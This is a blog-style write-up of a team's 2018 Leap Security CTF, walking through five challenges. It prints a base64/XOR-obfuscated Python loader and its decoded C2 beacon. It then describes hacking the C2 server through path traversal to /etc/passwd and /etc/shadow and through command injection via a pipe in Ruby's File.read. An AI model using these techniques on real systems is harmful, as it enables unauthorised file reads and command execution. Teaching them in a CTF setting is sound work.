---
layout: post
title:  "Leap Security CTF Post-Mortem"
date:   2018-12-29 01:49:29 -0500
categories: 
---

The [Leap Security CTF](https://www.leapsecurity.io/blog/leap-security-capture-the-flag-2018/) was the second CTF 
I participated in as a member of [#misec](https://www.misec.us/). Three of us met up at around 11 AM to get set up.
I'd previously taken part in RuCTFE, where we had to meet at 4AM to be ready for a 5AM game start; by comparison, this
was a much gentler wake up time.

I decided to check the Leap Security Twitter page early just to see if I could get any clues ahead of time. To my surprise,
the CTF had opened hours before it was scheduled- closer to noon UTC than noon EST. And of course time was the tiebreaker,
meaning we had to get to work.

# Flag 1: OSINT Sanity Check

This was one of the smallest flags in terms of points, and judging from the name, one of the easiest in theory.
The CTF rules said that the start and hint for the first CTF challenge would go live on their Twitter feed at the same time
as the game did. The seemingly obvious conclusion was that [the opening tweet](https://twitter.com/LeapSecurity/status/1073934006448783360)
would be relevant. This was reinforced by the CTF's challenges page saying that if we followed Leap Security on Twitter that the
flag should be easy.

So naturally, we broke down everything we could in that tweet. The binary in the image translated to "Hello World".
This yielded nothing. Neither did entering in various forms of big cat, nor anything else we could find on Twitter.
Periodically as we worked on the rest of the CTF, we'd return to this one for a little while and bang out heads against the wall.
Despite being called a sanity check, this flag had a lower solve rate than many others according to the scoreboards.

I'd allowed myself to get blinders on from my early reading. Later I'd learn that the actual flag had been posted as a string
in a tweet from November 15th; I never scrolled that far back because I'd been certain the info must have been released on the day of the CTF.
In hindsight, the early start should have been a signal to me not to take the announcement page as gospel; I'm still kicking
myself over this simple failure, but it's a good lesson to question assumptions.

# Flag 2: 0x00sec forum

One thing the announcement page did note was that we would have to register for the forum and achieve Trust Level 1.
The challenge linked to a members' only section of the forum; when I viewed it with an account without that trust level,
I got a series of links to other parts of the board instead. Fortunately, getting a higher level of trust was simple-
just register an account and read the forums for a little bit, and then you gained post privileges and the rights to
the members only area, which had a post with a very obvious flag.

This flag was worth more points than just about anything else. It's a clever way for 0x00sec to try to get new members
into the community via the CTF, but the point value was just way too high for the work involved in my opinion.

# Flag 3: Reverse Engineering

You're given a Python "malware" to analyze and instructed to find the IP address; according to the scenario,
the malware was found running in the server's temporary directory. The original source is below:

```python
#!/usr/bin/env python

import base64
import os

yo = "TiNcB01HJ0BmPCccTCw7HExHPwpsEx0bdSM0F0wZOx5OLCNAdSwkH2QgAjtsIwEHZjBdF2YeKApgJ1lBYCdZRWInWUVhJyQ7bCwkF38nLwl1LCtBdSwjQEwNWAdNRyNAZDcJH0s8PwdgHVUGZQ0sAmYzAQdmNx4XZQ4CRGIwCgdjRisHTidUCXUjCQBMRz8cTB0OA2YzPxhLMyhJSg0JGEwzAQJ1LAYeYB0JJXUaBRh6Mzc+exkoCUwONzt1GgEydiw7HX8OIzxMRD8dZUddAGwTHRt1IzQXTTMBCksyVBh1RjsFSzwgH2QgAjtsIwEHZjBdF2YeKApgJ1lBYCdZRWInWUVhJyQ7bCwkF38nLwl1LCtBdSwjQEwNWB51LDwfZUYFQEs8LEZjDVUeZjceF04sLBdkDSweYB4KB2AwLAZ2LC8AY0YVAExHPB5jNy8bdiw/GH8sHh52LC8ATkY7RWUOAh55MzdEdiIvHXshWBhiGiBCfBk3RX4jK0F1HlUKfEcjNXUdDgNmNwkdTiMVHGUOAh54IgkbTTMnBXoaHT1NGCRAdTErBn8nCUlkJQI6TDwnAE0aPBdMHVgaTUZYQHUjWEBsEx0JdSMJAExHPxxMHQoAbBNQTQ=="

exec base64.b64decode(bytearray(a^b for a,b in zip(*map(bytearray, [base64.b64decode(yo), str(os.environ["PWD"]) * 460]))))
```

So we have a base64 encoded string which then uses the current working directory of the script as part of the decoding
process. Since it was in the temporary directory, we can easily replace `str(os.environ["PWD"])` with `/tmp` so that
this will decode correctly anywhere. Once it's decoded, `exec` immediately runs it, which we obviously don't want to do.
Replacing it with a simple `print` is trivial and gives us the following deobfuscated code:

```python
import requests

def register():
        ip = "139.59.91.95"
        r = requests.post('http://' + ip + ':8080/api/register', data={'apikey':'TfxaPfMNa2s6JfyAauf?3KsDf'})

def list_agents():
        ip = "139.59.91.95"
        r = requests.get('http://' + ip + ':8080/api/list', data={'apikey':'TfxaPfMNa2s6JfyAauf?3KsDf', 'file':'YWdlbnRzLnR4dAo='})
        print r.content

register()
```

The IP address of 139.59.91.95 is the flag. This is actually the first flag I completed that day and with #misec in general.

# Flag 4: Hack back

We have permission to hack into the malware author's c2 setup running at that IP address. This was where the real fun began.
The malware has two functions, but only `register` was being used. Obviously I didn't want to call that, so I decided to take
a look at `list_agents`. Calling that instead yielded a list of IP addresses and timestamps for when they were registered.
Calling `register` would add your IP address to this list as a sort of hall of shame. 

More interesting than the results of calling the function was the file parameter being passed to the API. This was another
base64-encoded string; decoding it showed the filename "agents.txt". If we base64-encoded a filename, we could pass any filename
we liked to the server and it would send it back to us. What else could we try? Asking for `../../../etc/passwd`
and `../../../etc/shadow` gave us all of the usernames on the system; `/etc/shadow` showed invalid password hashes, meaning that
logging in via ssh would be effectively impossible.

Next we passed an invalid filename. Jackpot; the request crashed, returning a full error trace that revealed that the c2 server's
code was stored in a file called `1337c2.rb`. Base64-encoding this and requesting it gave us the following Ruby code:

```ruby
#!/usr/bin/env ruby

require 'sinatra'
require 'json'
require 'base64'

apikey = "TfxaPfMNa2s6JfyAauf?3KsDf"

set :bind, '0.0.0.0'
set :port, 8080

def rickroll() 
        return '<script>window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");</script>'
end

def register(ip) 
        open('agents.txt', 'a') { |f|
                time = Time.now().to_s
                f.puts JSON.generate({"ip"=>ip, "time"=>time})
        }
end

get '/' do
        rickroll()
end

post "/api" do
        if params["apikey"] == apikey
                return "access granted"
        else
                return 'Access Denied'
        end
end

post "/api/register" do
        if params["apikey"] == apikey
                ip = request.ip
                register(ip)
                return "registered"
        else
                return 'Access Denied'
        end
end

get "/api/list" do
        if params["apikey"] == apikey
                query = params["file"]
                file_path = Base64.decode64(query)
                contents = File.read(file_path.chomp)
                return contents
        else
                return 'Access Denied'
        end
end

get "/*" do
        rickroll()
end
```

No surprises from the register APIs. Rickrolling on any invalid endpoints was a nice touch. More interesting
was the list function that we'd been abusing to request files: I hoped that call to `File.read` was able to
do something more interesting than just read filenames given to it. I sent a message to our resident Ruby
expert [@picat](https://twitter.com/KentGruber) about this. My hope was that there would be some way to
pass a directory to it and get back the contents rather than just passing files.

After he did a lookup on the API, I got back better news than I could have ever dreamed of- `File.read`
would accept arbitrary shell commands if you used a pipe at the beginning! Passing `| ls -la` would give
a complete directory listing. We found the expected files `1337c2.rb` and `agents.txt` again, as well as
a few pranks left behind by other CTF competitors... and inside a hidden file, we found the flag.

# Flag 5: Cryptography (bonus)

Given an arbitrary text string, find the decrypted version. Running it through all the standard encodings
in CyberChef yielded nothing. Around this point we decided that we probably weren't going to get it and
left to grab a few beers and socialize. I'm glad we did: the final answer that I'd learn later was that
the solution was to first perform a base62 decode, then a rot13. Base62 alone would have been unusual
enough that I probably wouldn't have tried it; having to know to follow it up with something else
was just a ton of combinations.

I don't know how often flags like this will come up, but it bothered me to not have an answer about
how to tackle it in the future. I could build a program that would run through all the possible permutations
of decoding steps, but I didn't want to look through thousands and thousands of failed decodes
looking for the real one; I'd probably get tired and scroll past it anyway. The suggestion given
was to reuse spell check code as a way of seeing if the output looked like English. It would probably
be good to have this program lying around so we have something to work from in case it comes up again... but
that's a project for another day.

# Endgame

In the end we scored 3 out of 5 flags. Flag 2 was gained in parallel by multiple individuals; I found
flag 3 relatively quickly; flag 4 was a team effort. [@nullspace](https://twitter.com/nullspace) and
@Gibby from #misec were on-site with me, in addition to @picat's aforementioned help.
I really enjoyed the experience of this CTF; I needed the confidence boost from the flags I got to
show me that I could do better than my lackluster performance at RuCTFE, and I'm already looking forward
to the next team-based event.

*Thanks to [@pry0cc](https://twitter.com/pry0cc) for answering my Twitter questions about the flags that
we missed, which allowed this writeup to cover the full competition; an even bigger thanks to Matt Topper
of UberEther for allowing us to use their offices as the #misec CTF headquarters.*